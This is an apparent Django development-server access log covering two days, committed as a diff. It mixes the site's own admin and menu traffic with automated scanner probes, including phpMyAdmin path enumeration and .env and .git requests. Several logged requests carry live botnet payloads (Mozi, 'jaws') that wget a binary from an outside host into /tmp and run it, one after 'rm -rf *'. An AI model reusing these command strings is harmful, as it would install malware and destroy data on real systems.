+[07/May/2022 09:40:49] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 404 2324
+[07/May/2022 09:50:51,362] - Broken pipe from ('167.94.146.60', 49328)
+
+Not Found: /
+[07/May/2022 09:50:52] "GET / HTTP/1.1" 404 2180
+[07/May/2022 09:50:52,952] - Broken pipe from ('167.94.146.60', 58316)
+
+Not Found: /
+[07/May/2022 09:50:53] "GET / HTTP/1.1" 404 2177
+[07/May/2022 09:50:54] code 505, message Invalid HTTP version (2.0)
+[07/May/2022 09:50:54] "PRI * HTTP/2.0" 505 -
+Not Found: /portal/redlion
+[07/May/2022 09:52:57] "GET /portal/redlion HTTP/1.1" 404 2237
+Not Found: /actuator/health
+[07/May/2022 10:03:49] "GET /actuator/health HTTP/1.1" 404 2240
+Not Found: /
+[07/May/2022 10:42:30] "GET / HTTP/1.0" 404 2180
+Not Found: /
+[07/May/2022 11:13:05] "GET / HTTP/1.1" 404 2180
+[07/May/2022 12:07:02] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[07/May/2022 12:07:02] "MGLNDD_118.67.132.87_80" 400 -
+Not Found: /
+[07/May/2022 12:09:59] "GET / HTTP/1.1" 404 2180
+Not Found: /.env
+[07/May/2022 12:34:12] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[07/May/2022 12:34:12] "POST / HTTP/1.1" 404 2178
+[07/May/2022 12:39:08] "GET /admin/ HTTP/1.1" 200 6834
+[07/May/2022 12:39:08] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[07/May/2022 12:39:08] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[07/May/2022 12:39:08] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[07/May/2022 12:39:08] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[07/May/2022 12:39:08] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[07/May/2022 12:39:08] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[07/May/2022 12:39:09] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /admin/menu/menu/ HTTP/1.1" 200 35497
+[07/May/2022 12:39:12] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[07/May/2022 12:39:12] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[07/May/2022 12:39:12] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[07/May/2022 12:45:37] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:49:17] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:49:24] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:49:30] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:51:39] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:51:46] "POST /menu/ HTTP/1.1" 200 177
+[07/May/2022 12:53:07] "POST /menu/ HTTP/1.1" 200 177
+[07/May/2022 12:57:59] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:58:11] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[07/May/2022 12:58:11] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[07/May/2022 12:58:11] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[07/May/2022 12:58:11] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[07/May/2022 12:58:11] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[07/May/2022 12:58:11] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[07/May/2022 12:58:11] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[07/May/2022 12:58:11] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[07/May/2022 12:58:12] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[07/May/2022 12:58:38] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[07/May/2022 12:58:38] "GET /admin/menu/menu/ HTTP/1.1" 200 36214
+[07/May/2022 12:58:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[07/May/2022 12:58:38] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 304 0
+[07/May/2022 12:58:50] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 12:59:19] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 13:03:27] "POST /menu/ HTTP/1.1" 200 195
+[07/May/2022 13:07:49] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 13:07:59] "POST /menu/ HTTP/1.1" 200 185
+[07/May/2022 13:10:19] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 13:10:28] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 13:10:38] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 13:11:22] "POST /menu/ HTTP/1.1" 200 201
+[07/May/2022 13:14:05] "GET /admin/ HTTP/1.1" 302 0
+[07/May/2022 13:14:05] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[07/May/2022 13:21:31] "POST /menu/ HTTP/1.1" 200 267
+[07/May/2022 13:41:39] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[07/May/2022 13:41:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[07/May/2022 13:41:50] "GET /admin/menu/menu/ HTTP/1.1" 200 36011
+[07/May/2022 13:41:50] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[07/May/2022 13:51:29] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 15:00:05] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 15:11:32] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 15:11:41] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 15:11:49] "POST /menu/ HTTP/1.1" 200 28
+[07/May/2022 15:16:26] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[07/May/2022 15:35:15] "GET / HTTP/1.1" 404 2177
+[07/May/2022 15:48:59] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+[07/May/2022 15:48:59] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+Not Found: /
+[07/May/2022 16:12:49] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 18:11:31] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 18:18:02] "GET / HTTP/1.1" 404 2177
+Not Found: /http:/www.msftncsi.com/ncsi.txt
+[07/May/2022 18:18:04] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 1842
+Not Found: /HNAP1/
+[07/May/2022 18:18:05] "GET /HNAP1/ HTTP/1.1" 404 2213
+Not Found: /hudson/script
+[07/May/2022 18:18:06] "GET /hudson/script HTTP/1.1" 404 2234
+Not Found: /script
+[07/May/2022 18:18:15] "GET /script HTTP/1.1" 404 2213
+Not Found: /sqlite/main.php
+[07/May/2022 18:18:19] "GET /sqlite/main.php HTTP/1.1" 404 2240
+Not Found: /sqlitemanager/main.php
+[07/May/2022 18:18:20] "GET /sqlitemanager/main.php HTTP/1.1" 404 2261
+Not Found: /SQLiteManager/main.php
+[07/May/2022 18:18:25] "GET /SQLiteManager/main.php HTTP/1.1" 404 2261
+Not Found: /SQLite/main.php
+[07/May/2022 18:18:29] "GET /SQLite/main.php HTTP/1.1" 404 2240
+Not Found: /SQlite/main.php
+[07/May/2022 18:18:39] "GET /SQlite/main.php HTTP/1.1" 404 2240
+Not Found: /main.php
+[07/May/2022 18:18:40] "GET /main.php HTTP/1.1" 404 2219
+Not Found: /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php
+[07/May/2022 18:18:41] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 404 2375
+Not Found: /SQLiteManager-1.2.4/main.php
+[07/May/2022 18:18:44] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 404 2279
+Not Found: /agSearch/SQlite/main.php
+[07/May/2022 18:18:47] "GET /agSearch/SQlite/main.php HTTP/1.1" 404 2267
+Not Found: /phpmyadmin/
+[07/May/2022 18:18:50] "GET /phpmyadmin/ HTTP/1.1" 404 2228
+Not Found: /phpMyAdmin/
+[07/May/2022 18:18:53] "GET /phpMyAdmin/ HTTP/1.1" 404 2228
+Not Found: /PMA/
+[07/May/2022 18:18:56] "GET /PMA/ HTTP/1.1" 404 2207
+Not Found: /pma/
+[07/May/2022 18:18:57] "GET /pma/ HTTP/1.1" 404 2207
+[07/May/2022 18:19:00] "GET /admin/ HTTP/1.1" 302 0
+[07/May/2022 18:19:03] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+Not Found: /dbadmin/
+[07/May/2022 18:19:05] "GET /dbadmin/ HTTP/1.1" 404 2219
+Not Found: /mysql/
+[07/May/2022 18:19:09] "GET /mysql/ HTTP/1.1" 404 2213
+Not Found: /myadmin/
+[07/May/2022 18:19:17] "GET /myadmin/ HTTP/1.1" 404 2219
+Not Found: /openserver/phpmyadmin/
+[07/May/2022 18:19:18] "GET /openserver/phpmyadmin/ HTTP/1.1" 404 2261
+Not Found: /phpmyadmin2/
+[07/May/2022 18:19:19] "GET /phpmyadmin2/ HTTP/1.1" 404 2231
+Not Found: /phpMyAdmin2/
+[07/May/2022 18:19:22] "GET /phpMyAdmin2/ HTTP/1.1" 404 2231
+Not Found: /phpMyAdmin-2/
+[07/May/2022 18:19:23] "GET /phpMyAdmin-2/ HTTP/1.1" 404 2234
+Not Found: /php-my-admin/
+[07/May/2022 18:19:25] "GET /php-my-admin/ HTTP/1.1" 404 2234
+Not Found: /phpMyAdmin-2.2.3/
+[07/May/2022 18:19:27] "GET /phpMyAdmin-2.2.3/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.2.6/
+[07/May/2022 18:19:33] "GET /phpMyAdmin-2.2.6/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.1/
+[07/May/2022 18:19:34] "GET /phpMyAdmin-2.5.1/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.4/
+[07/May/2022 18:19:38] "GET /phpMyAdmin-2.5.4/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.5-rc1/
+[07/May/2022 18:19:40] "GET /phpMyAdmin-2.5.5-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.5.5-rc2/
+[07/May/2022 18:19:42] "GET /phpMyAdmin-2.5.5-rc2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.5.5/
+[07/May/2022 18:19:46] "GET /phpMyAdmin-2.5.5/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.5-pl1/
+[07/May/2022 18:19:47] "GET /phpMyAdmin-2.5.5-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.5.6-rc1/
+[07/May/2022 18:19:48] "GET /phpMyAdmin-2.5.6-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.5.6-rc2/
+[07/May/2022 18:19:50] "GET /phpMyAdmin-2.5.6-rc2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.5.6/
+[07/May/2022 18:19:52] "GET /phpMyAdmin-2.5.6/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.7/
+[07/May/2022 18:19:55] "GET /phpMyAdmin-2.5.7/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.5.7-pl1/
+[07/May/2022 18:19:56] "GET /phpMyAdmin-2.5.7-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0-alpha/
+[07/May/2022 18:19:59] "GET /phpMyAdmin-2.6.0-alpha/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.6.0-alpha2/
+[07/May/2022 18:20:03] "GET /phpMyAdmin-2.6.0-alpha2/ HTTP/1.1" 404 2267
+Not Found: /phpMyAdmin-2.6.0-beta1/
+[07/May/2022 18:20:04] "GET /phpMyAdmin-2.6.0-beta1/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.6.0-beta2/
+[07/May/2022 18:20:05] "GET /phpMyAdmin-2.6.0-beta2/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.6.0-rc1/
+[07/May/2022 18:20:10] "GET /phpMyAdmin-2.6.0-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0-rc2/
+[07/May/2022 18:20:13] "GET /phpMyAdmin-2.6.0-rc2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0-rc3/
+[07/May/2022 18:20:15] "GET /phpMyAdmin-2.6.0-rc3/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0/
+[07/May/2022 18:20:16] "GET /phpMyAdmin-2.6.0/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.6.0-pl1/
+[07/May/2022 18:20:17] "GET /phpMyAdmin-2.6.0-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0-pl2/
+[07/May/2022 18:20:19] "GET /phpMyAdmin-2.6.0-pl2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.0-pl3/
+[07/May/2022 18:20:20] "GET /phpMyAdmin-2.6.0-pl3/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.1-rc1/
+[07/May/2022 18:20:22] "GET /phpMyAdmin-2.6.1-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.1-rc2/
+[07/May/2022 18:20:24] "GET /phpMyAdmin-2.6.1-rc2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.1/
+[07/May/2022 18:20:25] "GET /phpMyAdmin-2.6.1/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.6.1-pl1/
+[07/May/2022 18:20:26] "GET /phpMyAdmin-2.6.1-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.1-pl2/
+[07/May/2022 18:20:27] "GET /phpMyAdmin-2.6.1-pl2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.1-pl3/
+[07/May/2022 18:20:30] "GET /phpMyAdmin-2.6.1-pl3/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.2-rc1/
+[07/May/2022 18:20:52] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.2-beta1/
+[07/May/2022 18:20:55] "GET /phpMyAdmin-2.6.2-beta1/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.6.2-rc1/
+[07/May/2022 18:20:57] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.2/
+[07/May/2022 18:20:58] "GET /phpMyAdmin-2.6.2/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.6.2-pl1/
+[07/May/2022 18:21:02] "GET /phpMyAdmin-2.6.2-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.3/
+[07/May/2022 18:21:05] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.6.3-rc1/
+[07/May/2022 18:21:06] "GET /phpMyAdmin-2.6.3-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.3/
+[07/May/2022 18:21:07] "GET /phpMyAdmin-2.6.3/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.6.3-pl1/
+[07/May/2022 18:21:11] "GET /phpMyAdmin-2.6.3-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4-rc1/
+[07/May/2022 18:21:14] "GET /phpMyAdmin-2.6.4-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4-pl1/
+[07/May/2022 18:21:16] "GET /phpMyAdmin-2.6.4-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4-pl2/
+[07/May/2022 18:21:18] "GET /phpMyAdmin-2.6.4-pl2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4-pl3/
+[07/May/2022 18:21:20] "GET /phpMyAdmin-2.6.4-pl3/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4-pl4/
+[07/May/2022 18:21:21] "GET /phpMyAdmin-2.6.4-pl4/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.6.4/
+[07/May/2022 18:21:24] "GET /phpMyAdmin-2.6.4/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.7.0-beta1/
+[07/May/2022 18:21:26] "GET /phpMyAdmin-2.7.0-beta1/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.7.0-rc1/
+[07/May/2022 18:21:27] "GET /phpMyAdmin-2.7.0-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.7.0-pl1/
+[07/May/2022 18:21:28] "GET /phpMyAdmin-2.7.0-pl1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.7.0-pl2/
+[07/May/2022 18:21:48] "GET /phpMyAdmin-2.7.0-pl2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.7.0/
+[07/May/2022 18:21:49] "GET /phpMyAdmin-2.7.0/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.8.0-beta1/
+[07/May/2022 18:21:50] "GET /phpMyAdmin-2.8.0-beta1/ HTTP/1.1" 404 2264
+Not Found: /phpMyAdmin-2.8.0-rc1/
+[07/May/2022 18:21:51] "GET /phpMyAdmin-2.8.0-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.8.0-rc2/
+[07/May/2022 18:21:52] "GET /phpMyAdmin-2.8.0-rc2/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.8.0/
+[07/May/2022 18:21:55] "GET /phpMyAdmin-2.8.0/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.8.0.1/
+[07/May/2022 18:22:04] "GET /phpMyAdmin-2.8.0.1/ HTTP/1.1" 404 2252
+Not Found: /phpMyAdmin-2.8.0.2/
+[07/May/2022 18:22:06] "GET /phpMyAdmin-2.8.0.2/ HTTP/1.1" 404 2252
+Not Found: /phpMyAdmin-2.8.0.3/
+[07/May/2022 18:22:08] "GET /phpMyAdmin-2.8.0.3/ HTTP/1.1" 404 2252
+Not Found: /phpMyAdmin-2.8.0.4/
+[07/May/2022 18:22:10] "GET /phpMyAdmin-2.8.0.4/ HTTP/1.1" 404 2252
+Not Found: /phpMyAdmin-2.8.1-rc1/
+[07/May/2022 18:22:11] "GET /phpMyAdmin-2.8.1-rc1/ HTTP/1.1" 404 2258
+Not Found: /phpMyAdmin-2.8.1/
+[07/May/2022 18:22:13] "GET /phpMyAdmin-2.8.1/ HTTP/1.1" 404 2246
+Not Found: /phpMyAdmin-2.8.2/
+[07/May/2022 18:22:14] "GET /phpMyAdmin-2.8.2/ HTTP/1.1" 404 2246
+Not Found: /sqlmanager/
+[07/May/2022 18:22:15] "GET /sqlmanager/ HTTP/1.1" 404 2228
+Not Found: /mysqlmanager/
+[07/May/2022 18:22:24] "GET /mysqlmanager/ HTTP/1.1" 404 2234
+Not Found: /p/m/a/
+[07/May/2022 18:22:25] "GET /p/m/a/ HTTP/1.1" 404 2213
+Not Found: /PMA2005/
+[07/May/2022 18:22:26] "GET /PMA2005/ HTTP/1.1" 404 2219
+Not Found: /pma2005/
+[07/May/2022 18:22:27] "GET /pma2005/ HTTP/1.1" 404 2219
+Not Found: /phpmanager/
+[07/May/2022 18:22:29] "GET /phpmanager/ HTTP/1.1" 404 2228
+Not Found: /
+[07/May/2022 18:48:45] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 18:59:03] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[07/May/2022 19:46:55] "GET / HTTP/1.1" 404 2177
+Not Found: /shell
+[07/May/2022 20:22:00] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+Not Found: /phpmyadmin/
+[07/May/2022 20:44:37] "GET /phpmyadmin/ HTTP/1.1" 404 2228
+[07/May/2022 20:44:38,169] - Broken pipe from ('95.33.128.107', 35410)
+
+Not Found: /
+[07/May/2022 20:52:00] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[07/May/2022 20:58:42] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 21:04:48] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[07/May/2022 21:23:05] "GET / HTTP/1.1" 404 2177
+Not Found: /config/getuser
+[07/May/2022 21:48:02] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[07/May/2022 22:38:44] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[07/May/2022 23:49:52] "GET / HTTP/1.1" 404 2180
+Not Found: /c/
+[07/May/2022 23:54:13] "GET /c/ HTTP/1.1" 404 2201
+Not Found: /
+[07/May/2022 23:55:47] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[08/May/2022 00:52:27] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 01:23:38] "GET / HTTP/1.1" 404 2180
+[08/May/2022 01:23:42,634] - Broken pipe from ('177.126.56.7', 55771)
+
+Not Found: /
+[08/May/2022 02:08:35] "GET / HTTP/1.1" 404 2177
+Not Found: /showLogin.cc
+[08/May/2022 02:08:41] "GET /showLogin.cc HTTP/1.1" 404 2231
+Not Found: /
+[08/May/2022 02:28:17] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 03:11:54] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 04:16:17] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 05:40:10] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[08/May/2022 06:23:01] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 09:08:46] "GET / HTTP/1.1" 404 2180
+[08/May/2022 10:44:23,513] - Broken pipe from ('45.227.254.52', 28660)
+
+[08/May/2022 10:44:23] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[08/May/2022 10:44:23] "  ,'à     Cookie: mstshash=Domain" 400 -
+[08/May/2022 10:44:24] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[08/May/2022 10:44:24] "  ,'à     Cookie: mstshash=Domain" 400 -
+Not Found: /
+[08/May/2022 12:23:48] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 14:19:27] "GET / HTTP/1.1" 404 2177
+Not Found: /.git
+[08/May/2022 14:19:28] "GET /.git HTTP/1.1" 404 2207
+[08/May/2022 14:21:28,399] - Broken pipe from ('15.237.130.194', 52524)
+
+Not Found: /
+[08/May/2022 14:37:26] "GET / HTTP/1.1" 404 2177
+Not Found: /config/getuser
+[08/May/2022 15:02:15] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /ab2g
+[08/May/2022 15:20:56] "GET /ab2g HTTP/1.1" 404 2218
+Not Found: /ab2h
+[08/May/2022 15:21:07] "GET /ab2h HTTP/1.1" 404 2218
+[08/May/2022 15:22:03] code 400, message Bad request syntax ('MGLNDD_118.67.132.87_80')
+[08/May/2022 15:22:03] "MGLNDD_118.67.132.87_80" 400 -
+Not Found: /
+[08/May/2022 15:42:59] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[08/May/2022 15:44:09] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 16:00:51] "GET / HTTP/1.1" 404 2188
+[08/May/2022 16:00:55,996] - Broken pipe from ('113.131.200.30', 33910)
+
+[08/May/2022 16:45:48,404] - Broken pipe from ('167.94.145.60', 51508)
+
+Not Found: /
+[08/May/2022 16:45:49] "GET / HTTP/1.1" 404 2180
+[08/May/2022 16:45:49,949] - Broken pipe from ('167.94.145.60', 58626)
+
+Not Found: /
+[08/May/2022 16:45:50] "GET / HTTP/1.1" 404 2177
+[08/May/2022 16:45:51] code 505, message Invalid HTTP version (2.0)
+[08/May/2022 16:45:51] "PRI * HTTP/2.0" 505 -
+Not Found: /
+[08/May/2022 16:48:52] "GET / HTTP/1.1" 404 2177
+Not Found: /favicon.ico
+[08/May/2022 16:48:52] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /
+[08/May/2022 16:58:38] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 17:06:34] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[08/May/2022 17:18:24] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 17:43:13] "GET / HTTP/1.1" 404 2180
+Not Found: /database/index.php
+[08/May/2022 18:17:31] "GET /database/index.php?lang=en HTTP/1.1" 404 2257
+Not Found: /phpmyadmin2021/index.php
+[08/May/2022 18:17:31] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 2275
+Not Found: /sql/phpMyAdmin/index.php
+[08/May/2022 18:17:31] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 2275
+Not Found: /
+[08/May/2022 18:52:22] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[08/May/2022 19:44:53] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[08/May/2022 19:44:55] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[08/May/2022 20:18:37] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[08/May/2022 20:43:24] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[08/May/2022 21:30:46] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[08/May/2022 21:42:40] "GET / HTTP/1.1" 404 2177
+[08/May/2022 22:20:17] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ cnc.krakenbit.net/jaws;sh+/tmp/jaws HTTP/1.1')
+[08/May/2022 22:20:17] "GET /shell?cd+/tmp;rm+-rf+*;wget+ cnc.krakenbit.net/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+[08/May/2022 22:30:33] "POST /menu/ HTTP/1.1" 200 185
+[08/May/2022 22:30:40] "POST /menu/ HTTP/1.1" 200 238
+[08/May/2022 22:30:46] "POST /menu/ HTTP/1.1" 200 211
+[08/May/2022 22:30:54] "POST /menu/ HTTP/1.1" 200 28
+[08/May/2022 22:32:26] "POST /menu/ HTTP/1.1" 200 189
+Not Found: /
+[08/May/2022 23:20:10] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[09/May/2022 00:18:38] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[09/May/2022 00:33:18] "GET / HTTP/1.1" 404 2177
+Not Found: /shell
+[09/May/2022 01:02:09] "GET /shell?cd+/tmp;rm+-rf+*;wget+141.95.84.78/jaws;sh+/tmp/jaws HTTP/1.1" 404 2262
+Not Found: /
+[09/May/2022 01:02:25] "GET / HTTP/1.1" 404 2177
+Not Found: /boaform/admin/formLogin
+[09/May/2022 01:14:18] "POST /boaform/admin/formLogin HTTP/1.1" 404 2268
+Not Found: /HNAP1/
+Not Found: /
+[09/May/2022 01:38:51] "GET / HTTP/1.1" 404 2180
+[09/May/2022 01:50:02] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 01:50:11] "POST /menu/ HTTP/1.1" 200 28
+[09/May/2022 01:50:21] "POST /menu/ HTTP/1.1" 200 211
+[09/May/2022 01:50:25] "POST /menu/ HTTP/1.1" 200 301
+[09/May/2022 01:50:41] "GET /admin/ HTTP/1.1" 200 6873
+[09/May/2022 01:50:41] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[09/May/2022 01:50:42] "GET /static/admin/css/base.css HTTP/1.1" 304 0
